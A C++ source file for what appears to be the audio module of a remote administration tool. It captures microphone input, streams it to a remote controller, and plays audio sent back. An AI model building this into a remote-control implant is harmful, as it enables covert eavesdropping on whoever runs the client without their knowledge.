#include "Audio.h"


CAudio::CAudio(CManager*pManager):
CMsgHandler(pManager,AUDIO)
{
	m_hWorkThread = NULL;			// grab thread.
	m_IsWorking = FALSE;			// 
}


CAudio::~CAudio()
{

}

void CAudio::OnOpen()
{

}

void CAudio::OnClose()
{
	OnAudioStop();
	OnAudioPlayStop();
}

void CAudio::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case AUDIO_BEGIN:
		OnAudioBegin();
		break;
	case AUDIO_STOP:
		OnAudioStop();
		break;
	case AUDIO_PLAY_BEGIN:
		OnAudioPlayBegin();
		break;
	case AUDIO_PLAY_STOP:
		OnAudioPlayStop();
		break;
	case AUDIO_PLAY_DATA:
		OnAudioPlayData(Buffer, dwSize);
		break;
	default:
		break;
	}
}

void CAudio::OnAudioPlayBegin(){
	OnAudioPlayStop();
	m_AudioPlay.InitPlayer();
}

void CAudio::OnAudioPlayStop(){
	m_AudioPlay.ClosePlayer();
}

void CAudio::OnAudioPlayData(char* buffer, DWORD size){
	if (!m_AudioPlay.IsWorking()){
		TCHAR szError[] = TEXT("m_AudioPlay.IsWorking() Is False");
		SendMsg(AUDIO_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	if (!m_AudioPlay.PlayBuffer(buffer, size)){
		TCHAR szError[] = TEXT("m_AudioPlay.PlayBuffer() Failed!");
		SendMsg(AUDIO_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}
}

void CAudio::OnAudioBegin()
{
	TCHAR szError[] = TEXT("Audio Init Grabber Failed");
	OnAudioStop();

	InterlockedExchange(&m_IsWorking, TRUE);
	if (m_AudioGrab.InitGrabber()){
		SendMsg(AUDIO_PLAY_BEGIN, 0, 0);		//通知对方打开播放器...
		m_hWorkThread = CreateThread(0, 0, 
			(LPTHREAD_START_ROUTINE)WorkThread, this, 0, 0);
	}
	else{
		InterlockedExchange(&m_IsWorking, FALSE);
		SendMsg(AUDIO_ERROR, (char*)szError, sizeof(TCHAR)*(lstrlen(szError) + 1));
	}
}

void CAudio::OnAudioStop()
{
	//停止发送线程.
	InterlockedExchange(&m_IsWorking, FALSE);
	if (m_hWorkThread){
		WaitForSingleObject(m_hWorkThread,INFINITE);
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}
	//关闭grabber..
	m_AudioGrab.CloseGrabber();
	SendMsg(AUDIO_PLAY_STOP, 0, 0);		//通知对方关闭播放器.
}

void __stdcall CAudio::WorkThread(CAudio*pThis)
{
	TCHAR szError[] = TEXT("Get Audio Buffer Error!");
	while (InterlockedExchange(&pThis->m_IsWorking, TRUE)){
		char*Buffer = NULL;
		DWORD dwLen = NULL;
		//获取buffer发送
		if (pThis->m_AudioGrab.GetBuffer((void**)&Buffer, &dwLen)){
			pThis->SendMsg(AUDIO_PLAY_DATA, Buffer, dwLen);
			free(Buffer);
		}
	}
	InterlockedExchange(&pThis->m_IsWorking, FALSE);
}